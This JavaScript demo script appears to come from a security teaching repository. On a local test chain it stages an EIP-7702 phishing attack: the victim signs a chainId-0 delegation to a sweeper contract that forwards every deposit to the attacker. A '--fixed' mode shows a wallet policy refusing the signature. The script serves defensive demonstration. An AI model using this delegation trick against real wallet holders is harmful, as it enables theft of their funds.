// Attack #1: a phishing EIP-7702 signature. The victim signs an authorization with
// chainId 0 (valid on every chain) delegating their EOA to our sweeper. After that,
// every deposit into the victim is forwarded to the attacker.
//   node demos/01-sweeper.mjs           victim signs it; 3 deposits of 1 ETH are swept
//   node demos/01-sweeper.mjs --fixed   the wallet policy refuses to sign the delegation
import { startChain, stopChain, deploy, roles, abis, delegate, codeOf, walletFor,
  pub, ethBalance, setEth, fmtEth, short, nonceOf, parseEther } from "../lib/chain.mjs";
import { makeWalletSigner, PolicyError } from "../lib/wallet-policy.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "sweeper-fixed" : "sweeper", fixed ? "7702 sweeper, fixed" : "7702 sweeper");
await startChain();

const sweeper = await deploy("sweeper", [roles.attacker.address]); // forwards to the attacker
await setEth(roles.victim.address, 0); // victim starts empty; deposits arrive during the demo
await setEth(roles.attacker.address, 0);

t.say(`victim ${short(roles.victim.address)} is asked to sign a 7702 authorization`);
t.cmd(`sign authorization: delegate ${short(sweeper)}, chainId 0`);

let delegated = false;
if (!fixed) {
  // Vulnerable: the victim signs a chainId-0 delegation to code they did not vet.
  await delegate(roles.victim, sweeper, { chainId: 0n });
  t.bad(`  signed → victim account now runs ${short(sweeper)}`);
  t.note(`  code at victim: ${(await codeOf(roles.victim.address)).slice(0, 10)}… (a 7702 delegation)`);
  delegated = true;
} else {
  // Fixed (wallet side): a policy in the wallet refuses chainId 0 and non-allowlisted delegates.
  const wallet = makeWalletSigner(roles.victim, { allowlist: [roles.relayer.address] });
  try {
    const auth = await wallet.signDelegation({ chainId: 0n, delegate: sweeper, nonce: await nonceOf(roles.victim.address) });
    await walletFor(roles.relayer).sendTransaction({ authorizationList: [auth], to: roles.relayer.address });
    t.bad(`  signed → victim account now runs ${short(sweeper)}`);
    delegated = true;
  } catch (e) {
    if (!(e instanceof PolicyError)) throw e;
    t.ok(`  REFUSED: ${e.message}`);
  }
}

t.cmd("send 1 ETH to the victim, three times");
for (let i = 0; i < 3; i++) {
  const hash = await walletFor(roles.relayer).sendTransaction({ to: roles.victim.address, value: parseEther("1") });
  await pub.waitForTransactionReceipt({ hash });
}
const vbal = await ethBalance(roles.victim.address);
const swept = await ethBalance(roles.attacker.address);
if (delegated) t.bad(`  each deposit ran the sweeper → attacker holds ${fmtEth(swept)} ETH`);
else t.ok(`  no delegation ran → deposits stayed with the victim`);

t.big(fixed ? "REFUSED: delegate not on allowlist (chainId 0)"
            : `balance ${fmtEth(vbal)} · swept ${fmtEth(swept)} ETH`);
t.save(); stopChain(); process.exit(0);
